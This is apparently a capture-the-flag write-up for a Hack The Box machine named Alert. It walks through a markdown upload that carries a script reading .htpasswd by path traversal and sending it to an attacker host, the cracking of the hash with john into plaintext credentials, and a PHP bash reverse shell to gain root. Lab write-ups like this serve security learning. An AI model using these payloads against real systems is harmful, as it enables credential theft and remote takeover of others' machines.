# ENUMERATION
---

## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | ssh     |
| 80   | http    |

We need to add `alert.htb` to `/etc/hosts` in order to access the website

`echo 'IP alert.htb' | sudo tee -a /etc/hosts`

Nice, let's begin with reconnaissance.
# RECONNAISSANCE
---

When we first access the website, we can find this:

![Pasted image 20250110145426.png](../../IMAGES/Pasted%20image%2020250110145426.png)

It is a markdown viewer website, we can only upload files with a `.md` extension, which is the markdown extension, let's upload a file and analyze its behavior using burp:

![Pasted image 20250110150021.png](../../IMAGES/Pasted%20image%2020250110150021.png)


# EXPLOITATION
---


The server basically processes the file with a function called `visualizer.php`, we need to upload a malicious `.md` file, I found we can perform [LFI](../../Bug%20Bounty/Vulnerabilities/SERVER%20SIDE%20VULNERABILITIES/FILE%20INCLUSION%20VULNERABILITIES/LOCAL%20FILE%20INCLUSION%20(LFI).md) let's reproduce these steps:

```js
<script>
fetch("http://alert.htp/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd")
  .then(response => response.text())
  .then(data => {
    fetch("http://IP:PORT/?file_content=" + encodeURIComponent(data));
  });
</script>
```

We are using `statistics.alert.htb` since I found that subdomain while fuzzing, it needed credentials.


```ad-hint
1. Upload a markdown file with the script embedded above.
2. Set up a python server to get the contents of the file we are going to read.
3. Receive the data in our python server.


##### Output
----

We got the following data from `.htpasswd`, htpasswd is used to create and update the flat-files used to store usernames and password for basic authentication of HTTP users.

It is url encoded, so, we get this: 

`%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A`

When we decode the data:

`<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/</pre>`

Let's use john to crack the hash, we can use the following command: 

`john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt`

We get the following output:


So, we got the following credentials:

`albert`:`manchesterunited`
```

Let's log into ssh with the found credentials:

![Pasted image 20250110155457.png](../../IMAGES/Pasted%20image%2020250110155457.png)

We are able to read `user.txt`:

![Pasted image 20250110155516.png](../../IMAGES/Pasted%20image%2020250110155516.png)

```ad-important
User: `c0ebbe25578f5ccb7a536e93d4e69238`
```


Let's begin PRIVESC

# PRIVILEGE ESCALATION
---


Let's run linpeas:


![Pasted image 20250110160337.png](../../IMAGES/Pasted%20image%2020250110160337.png)

First, there's something running on port `8080`, let's use ssh tunneling, but I also found something interesting:


![Pasted image 20250110160647.png](../../IMAGES/Pasted%20image%2020250110160647.png)

There's a directory that has root access, let's reproduce the following steps in order to get a root shell:

```php
<?php
exec("/bin/bash -c 'bash -i >/dev/tcp/IP/PORT 0>&1'");
?>
```

```ad-hint
1. Create a `.php` file with the contents above, save the file at `opt/website-monitor/config`
2. Use ssh tunneling to view the contents of the website running on port `8080`: `ssh -L 8080:127.0.0.1:8080 albert@alert.htb`.
3. Set up listener regarding the port we specified in the file we created.
4. Visit `127.0.0.1:8080/nameofthefileuploaded.php` 
5. Receive root connection on our listening netcat.

### Output
----


```

We got a root shell, let's read flag:

![Pasted image 20250110161352.png](../../IMAGES/Pasted%20image%2020250110161352.png)

```ad-important
root: `f6a8586a751b4a7f1203d20b0fef1e6a`
```

